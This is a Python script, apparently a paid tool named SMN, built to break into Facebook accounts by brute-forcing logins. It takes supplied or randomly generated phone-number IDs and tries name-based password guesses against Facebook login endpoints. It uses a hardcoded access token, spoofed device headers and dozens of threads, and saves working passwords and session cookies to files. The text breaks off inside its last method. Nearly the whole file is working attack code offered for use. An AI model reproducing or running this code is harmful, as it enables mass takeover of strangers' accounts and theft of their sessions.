"""
----------------------------------------------------------------------------
~/ THIS SCRIPT CREATE BY SIHAB
~/ FOR SMN
~/ CREATE DATE : 19 MARCH 2025
~/ LAST UPDATE : 31 MARCH 2025
----------------------------------------------------------------------------
"""
#__________/-MODULE-\__________#
import os,random,string,time,sys,requests,uuid,json
from os import system
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#__________/-COLOR-\__________#
G="\033[1;92m"
W="\x1b[38;5;15m"
B="\033[1;34m"
Y="\x1b[38;5;226m"
A="\x1b[38;5;123m"
R="\33[1;91m"
O="\x1b[38;5;81m"
X="\x1b[38;5;205m"
P="\x1b[10;95m"
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________/-SYTLE-\__________#
xr = f"{G}>{R}>{G}>{W}"
xrxx = f"{G}/{R}={G}/{W}"
xrx = f"{G}/{R}??{G}/{W}"
xr1 = f"{G}/{R}1{G}/{W}"
xr2 = f"{G}/{R}2{G}/{W}"
xr0 = f"{G}/{R}0{G}/{W}"
#__________/-SYS-\__________#
sys.stdout.write('\x1b[1;37m\x1b]2; SMN\x07')
#__________/-CODE-\__________#
num = f"{xrxx} EXAMPLE   {xr}{G} 016 {R}/{G} 017 {R}/{G} 018 {R}/{G} 019 "
#__________/-LIMIT-\__________#
limit = f"{xrxx} EXAMPLE   {xr}{G} 6666 {R}/{G} 7777 {R}/{G} 8888 {R}/{G} 9999 "
#__________/-METHOD-\__________#
methodx = f"{xr1} METHOD {G}/{R}API{G}/\n{xr2} METHOD {G}/{R}GRAPH{G}/"
methodxx = f"{xr1} METHOD {G}/{R}B-GRAPH{G}/\n{xr2} METHOD {G}/{R}GRAPH{G}/"
#__________/-RANDOM-COLOR-\__________#
gf = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m"])
#__________/-LOGO-\__________#
logo = (f"""
{A}
{G1} 
\33[1;96m   _____ __  __ _   _  
\x1b[38;5;196m  / ____|  \/  | \ | | 
\x1b[38;5;46m | (___ | \  / |  \| | 
 \x1b[38;5;83m \___ \| |\/| | . ` | 
\x1b[38;5;50m  ____) | |  | | |\  | 
\33[1;96m |_____/|_|  |_|_| \_| 
                          {G4}V{G3}/0.3
{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}={G1}]{G1} OWNER     {A}:{G1} SAMIUL ISLAM SIHAB
{G1}[{A}={G2}]{G2} FACEBOOK  {A}:{G2} SAMIUL ISLAM SIHAB
{G1}[{A}={G3}]{G3} TOOLTYPE  {A}:{G3} FILE {A}&{G4} RANDOM CLONING
{G1}[{A}={G4}]{G4} STATUS    {A}:{G4} Paid
{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
import os, sys, time, json, urllib.request,httpx

def sihab():
	a=str(os.geteuid())
	b=str(os.getlogin())
	y="".join(a+b)
	key=f"SIHAB_{y}_PAID"
	row=httpx.get("https://github.com/SIHAB-404/Approval/blob/main/Approval.txt").text
	if key in row:
		menu()
	else:
		   os.system("clear")
		   print(logo)				
		   print("\033[1;32m┏━➤[\033[1;33m𝟷]💙\033[1;32mWI-FI AND DATA BOTH WORKING 100")
		   print("\033[1;33m┗━➤[\033[1;32m2]💛\033[1;33m15 DAY 400 TAKA")
		   print("\033[1;36m┏━➤[\033[1;32m3]🧡\033[1;36m30 DAY 700 TAKA")
		   print("\033[1;35m┗━➤[\033[1;32m4]💚\033[1;35m️ONLY ACTIVE ID CLONING ")
		   print("\033[1;31m┏━➤[\033[1;32m5]💖\033[1;31mYOUR KEY IS NOT APPROVED")
		   print("\033[1;32m┗━➤[\033[1;32m6]❤\033[1;32m️PLEASE GET APPROVE")		   
		   os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,	samiul,	islam,   SIHAB,    Please,   Send,   Your,   Key, 	for,	approve"')
		   print("\033[1;37m┏━➤[\033[1;32m7]💝 \033[1;37mYOUR KEY : "+key)		   		   
		   sm=input("\033[1;33m┗━➤[\033[1;33m8]🤎\033[1;33mPress Enter To Send Key")
		   tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+key);os.system('am start https://wa.me/+8801719804173?text='+tks),approval()      	   
		   sys.exit()
#__________/-SELF-\__________#
class __SMNX__:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []
        self.plist = []
#__________/-CLEAR-\__________#
    def __clearX__(self):
    	system('clear')
    	print(logo)
#__________/-LINE-\__________#
    def __lineX__(self):
    	print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#__________/-MAIN-MENU-\__________#
    def __meNu__(self):
    	self.__clearX__()
    	print(f"{xr1} FILE CLONING ")
    	print(f"{xr2} RANDOM CLONING ")
    	print(f"{xr0} EXIT TOOLS ")
    	self.__lineX__()
    	__menU__ = input(f"{xrx} INPUT MENU {xr} ")
    	if __menU__ == ("1"):
    	    self.__fileX__()
    	elif __menU__ == ("2"):
    	    self.__randomX__()
    	elif __menU__ == ("0"):
    	    print(f"{xrxx} THANKS FOR USING.....! ")
    	else:
    	    self.__lineX__()
    	    print(f"{xrxx} OPTION NOT FOUND....! ")
    	    time.sleep(1)
    	    self.__meNu__()
#__________/-FILE-MENU-\__________#
    def __fileX__(self):
    	self.__clearX__()
    	print(f"{xrxx} EXAMPLE   {xr}{R} /{G}sdcard{R}/{G}SMN.txt")
    	self.__lineX__()
    	__fileC__ = input(f"{xrx} INPUT FILE {xr} ")
    	try:
    	    __fileL__ = open(__fileC__,'r').read().splitlines()
    	except FileNotFoundError:
    	    self.__lineX__()
    	    print(f"{xrxx} FILE NOT FOUND....! ")
    	    time.sleep(1)
    	    self.__fileX__()
    	self.__clearX__()
    	print(methodx)
    	self.__lineX__()
    	__methodX__ = input(f"{xrx} INPUT METHOD {xr} ")
    	self.__clearX__()
    	print(f"{xr1} AUTO PASSWORD {G}>{W}70+{R}-{W}PASS{G}<{W} ")
    	print(f"{xr2} CUSTOM PASSWORD ")
    	self.__lineX__()
    	__pasX__ = input(f"{xrx} INPUT PASSLIST {xr} ")
    	if __pasX__ == ("1"):
            self.plist.append("first2025")
            self.plist.append("first2024")
            self.plist.append("first1")
            self.plist.append("first12")
            self.plist.append("first123")
            self.plist.append("first1234")
            self.plist.append("first1235")
            self.plist.append("first1236")
            self.plist.append("first@1")
            self.plist.append("first@12")
            self.plist.append("first@123")
            self.plist.append("first@1234")
            self.plist.append("first@12345")
            self.plist.append("first@12346")
            self.plist.append("000999")
            self.plist.append("@first@")
            self.plist.append("first@@")
            self.plist.append("firstlast1234")
            self.plist.append("first321")
            self.plist.append("firstlast")
            self.plist.append("firstlast123")
            self.plist.append("123412")
            self.plist.append("0987654")
            self.plist.append("@1234@")
            self.plist.append("09876543")
            self.plist.append("@@@@####")
            self.plist.append("@@@###")
            self.plist.append("@123456@")
            self.plist.append("@12345678@")
            self.plist.append("first4321")
            self.plist.append("firstlast2025")
            self.plist.append("firstlast2024")
            self.plist.append("firstlast1")
            self.plist.append("firstlast12")
            self.plist.append("firstlast123")
            self.plist.append("firstlast1234")
            self.plist.append("firstlast1235")
            self.plist.append("firstlast1236")
            self.plist.append("firstlast@1")
            self.plist.append("firstlast@12")
            self.plist.append("firstlast@123")
            self.plist.append("firstlast@1234")
            self.plist.append("firstlast@12345")
            self.plist.append("firstlast@12346")
            self.plist.append("@firstlast@")
            self.plist.append("firstlast@@")
            self.plist.append("firstlastfirstlast1234")
            self.plist.append("firstlast321")
            self.plist.append("firstlastfirstlast")
            self.plist.append("firstlastfirstlast123")
            self.plist.append("firstlast4321")
    	else:
    	    try:
    	        self.__clearX__()
    	        print(f"{xrxx} EXAMPLE {xr}{G} BANGLADESH PASSWORD 10{R}-{G}15 LIMIT ")
    	        print(f"{xrxx} EXAMPLE {xr}{G} OTHERS COUNTRY PASSWORD 5{R}-{G}10 LIMIT ")
    	        self.__lineX__()
    	        pas_limit = int(input(f"{xrx} PASSWORD LIMIT {xr} "))
    	    except:
    	        pas_limit = 5
    	    self.__clearX__()
    	    print(f"{xrxx} EXAMPLE   {xr}{G} firstlast {R}/{G} first12 {R}/{G} first123 ")
    	    self.__lineX__()
    	    for i in range(pas_limit):
    	        self.plist.append(input(f"{xrxx} ENTER PASSWORD {G}/{R}{i+1}{G}/ {xr} "))
    	with ThreadPool(max_workers=30) as __SMNXX__:
    	    self.__clearX__()
    	    total_ids = str(len(__fileL__))
    	    print(f"{xrxx} TOTAL UID {xr} {W}{total_ids} ")
    	    print(f"{xrxx} IF NO RESULT ON{G}/{W}OFF AIRPLANE MODE...! ")
    	    self.__lineX__()
    	    for user in __fileL__:
        	    ids,names = user.split('|')
        	    passlist = self.plist
        	    if __methodX__ in ("1"):
        	        __SMNXX__.submit(self.___M1XX___,ids,names,passlist)
        	    elif __methodX__ in ("2"):
        	        __SMNXX__.submit(self.___M2XX___,ids,names,passlist)
        	    else:
        	        __SMNXX__.submit(self.___M1XX___,ids,names,passlist)
    	print("\033[1;37m")
    	print(f"{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    	print(f"{xrxx} THE PROCESS HAS COMPLETED...!")
    	print(f"{xrxx} TOTAL {B}OK{W}/{R}CP {xr}{B} "+str(len(self.oks))+f"{W}/{R}"+str(len(self.cps)))
    	print(f"{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    	print(f"{xrxx} THANKS FOR USING.....! ")
#__________/-FILE-M1-\__________#
    def ___M1XX___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            ne = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
            sys.stdout.write(f"\r\r{xrxx}{R}-{G}/{ne}SMN-M1{G}/{R}-{G}/{W}{self.loop}{G}/{R}-{G}/{B}{len(self.oks)}{G}/{R}-{G}{G}/{R}{len(self.cps)}{G}/")
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family = str(uuid.uuid4())
                advertiser_id = str(uuid.uuid4())
                data = {'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'cpl': 'true',
                'family_device_id': family,
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': ids,
                'password': pas,
                'access_token': f'{accessToken}',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': advertiser_id,
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {
                'User-Agent': self.__UPD__(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                url = 'https://api.facebook.com/auth/login'
                SMNt = requests.post(url,data=data,headers=headers).json()
                if "session_key" in SMNt:
                    cookies = ";".join(i["name"]+"="+i["value"] for i in SMNt["session_cookies"])
                    print(f"\r\r{xrxx}{R}-{G}/{B}SMN-OK{G}/ {xr}{B} "+ids+f"{G} / {B}"+pas+"\033[1;97m")
                    print(f"{xrxx}{R}-{G}/{B}COOKIE{G}/  {xr}{P} "+cookies)
                    self.__lineX__()
                    open('/sdcard/SMN-FILE-M1-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in SMNt['error']['message']:
                    print(f"\r\r{xrxx}{R}-{G}/{R}SMN-CP{G}/ {xr}{R} "+ids+f"{G} / {R}"+pas+"\033[1;97m")
                    self.__lineX__()
                    open('/sdcard/SMN-FILE-M1-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:
            pass
#__________/-FILE-M2-\__________#
    def ___M2XX___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            ne = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
            sys.stdout.write(f"\r\r{xrxx}{R}-{G}/{ne}SMN-M2{G}/{R}-{G}/{W}{self.loop}{G}/{R}-{G}/{B}{len(self.oks)}{G}/{R}-{G}{G}/{R}{len(self.cps)}{G}/")
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family = str(uuid.uuid4())
                advertiser_id = str(uuid.uuid4())
                data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'cpl': 'true',
                'family_device_id': family,
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': ids,
                'password': pas,
                'access_token': accessToken,
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': advertiser_id,
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {
                'User-Agent': self.__UPD__(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                url = 'https://graph.facebook.com/auth/login'
                SMNt = requests.post(url,data=data,headers=headers).json()
                if "session_key" in SMNt:
                    cookies = ";".join(i["name"]+"="+i["value"] for i in SMNt["session_cookies"])
                    print(f"\r\r{xrxx}{R}-{G}/{B}SMN-OK{G}/ {xr}{B} "+ids+f"{G} / {B}"+pas+"\033[1;97m")
                    print(f"{xrxx}{R}-{G}/{B}COOKIE{G}/  {xr}{P} "+cookies)
                    self.__lineX__()
                    open('/sdcard/SMN-FILE-M2-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in SMNt['error']['message']:
                    print(f"\r\r{xrxx}{R}-{G}/{R}SMN-CP{G}/ {xr}{R} "+ids+f"{G} / {R}"+pas+"\033[1;97m")
                    self.__lineX__()
                    open('/sdcard/SMN-FILE-M2-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:
            pass
#__________/-RANDOM-MENU-\__________#
    def __randomX__(self):
    	self.__clearX__()
    	print(num)
    	self.__lineX__()
    	__codeX__ = input(f"{xrx} INPUT CODE {xr} ")
    	self.__clearX__()
    	print(limit)
    	self.__lineX__()
    	__limitX__ = int(input(f"{xrx} INPUT LIMIT {xr} "))
    	self.__clearX__()
    	print(methodxx)
    	self.__lineX__()
    	__methodX__ = input(f"{xrx} INPUT METHOD {xr} ")
    	for a in range(__limitX__):
    	    initxd = "".join(random.choice(string.digits) for _ in range(8))
    	    self.gen.append(initxd)
    	with ThreadPool(max_workers = 60) as __SMNXXX__:
    	    self.__clearX__()
    	    print(f"{xrxx} CODE  {xr}{G} {__codeX__} ")
    	    print(f"{xrxx} LIMIT {xr}{G} {__limitX__} ")
    	    print(f"{xrxx} IF NO RESULT ON{R}/{W}OFF AIRPLANE MODE ")
    	    self.__lineX__()
    	    for ___SMN___ in self.gen:
    	        ids = __codeX__ + ___SMN___
    	        passlist = [ids,ids[:8],ids[:7],ids[:6],___SMN___,___SMN___[1:],___SMN___[2:]]
    	        if __methodX__ in ("1"):
    	            __SMNXXX__.submit(self.__M1X__,ids,passlist)
    	        elif __methodX__ in ("2"):
    	            __SMNXXX__.submit(self.__M2X__,ids,passlist)
    	        else:
    	            __SMNXXX__.submit(self.__M1X__,ids,passlist)
    	print('\033[1;37m')
    	print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    	print(f'{xrxx} THE PROCESS HAS COMPLETED')
    	print(f'{xrxx} TOTAL {B}OK{G}/{R}CP {xr}{B} '+str(len(self.oks))+f'{G}/{R}'+str(len(self.cps)))
    	print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    	print(f"{xrxx} THANKS FOR USING.....! ")
#__________/-RANDOM-M1-\__________#
    def __M1X__(self,ids,passlist):
    	global loop,oks,cps
    	ne = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
    	sys.stdout.write(f"\r\r{xrxx}{R}-{G}/{ne}SMN-M1{G}/{R}-{G}/{W}{self.loop}{G}/{R}-{G}/{B}{len(self.oks)}{G}/{R}-{G}{G}/{R}{len(self.cps)}{G}/")
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {
                'adid':adid,
                'format':'json',
                'device_id':device_id,
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_GB',
                'client_country_code':'GB',
                'fb_api_req_friendly_name':'authenticate'}
                headers={
                'User-Agent':self.__UPD__(),
                'Accept-Encoding':'gzip,deflate',
                'Accept':'*/*',
                'Connection':'keep-alive',
                'Authorization':f'OAuth {accessToken}',
                'X-FB-Friendly-Name':'authenticate',
                'X-FB-Connection-Bandwidth':str(random.randint(20000,40000)),
                'X-FB-Net-HNI':str(random.randint(20000,40000)),
                'X-FB-SIM-HNI':str(random.randint(20000,40000)),
                'X-FB-Connection-Type':'unknown',
                'Content-Type':'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine':'Liger'}
                url = 'https://b-graph.facebook.com/auth/login'
                SMNt = requests.post(url,data=data,headers=headers).json()
                if "session_key" in SMNt:
                    uid = SMNt['uid']
                    cookies = ";".join(i["name"]+"="+i["value"] for i in SMNt["session_cookies"])
                    print(f"\r\r{xrxx}{R}-{G}/{B}SMN-OK{G}/ {xr}{B} {str(uid)} {G}/{B} {pas}")
                    print(f"{xrxx}{R}-{G}/{B}COOKIE{G}/  {xr}{P} "+cookies)
                    self.__lineX__()
                    open('/sdcard/SMN-RANDOM-M1-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(str(uid))
                    break
                elif 'www.facebook.com' in SMNt['error']['message']:
                    uid = SMNt['error']['error_data']['uid']
                    print(f"\r\r{xrxx}{R}-{G}/{R}SMN-CP{G}/ {xr}{R} {str(uid)} {G}/{R} {pas}")
                    self.__lineX__()
                    open('/sdcard/SMN-RANDOM-M1-CP.txt','a').write(str(uid)+'/'+pas+'\n')
                    self.cps.append(str(uid))
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
#__________/-RANDOM-M2-\__________#
    def __M2X__(self,ids,passlist):
    	global loop,oks,cps
